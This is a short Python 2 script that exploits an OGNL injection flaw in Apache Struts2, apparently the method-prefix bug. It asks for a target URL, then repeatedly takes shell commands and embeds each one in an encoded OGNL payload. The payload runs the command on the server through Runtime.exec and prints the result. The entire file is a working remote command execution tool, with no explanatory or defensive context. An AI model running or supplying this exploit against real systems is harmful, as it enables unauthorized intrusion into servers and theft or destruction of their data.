import urllib
import sys

def gethtml(url):
	page=urllib.urlopen(url)
	html=page.read()
	return html

def main():
	s=raw_input("> URL:")
	while True:
		cmd=raw_input("> CMD:")
		htmlll=s+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd="+ cmd +"&pp=\\A&ppp=%20&encoding=UTF-8"
		htmll=gethtml(str(htmlll))
		print htmll


if __name__=='__main__':
	main()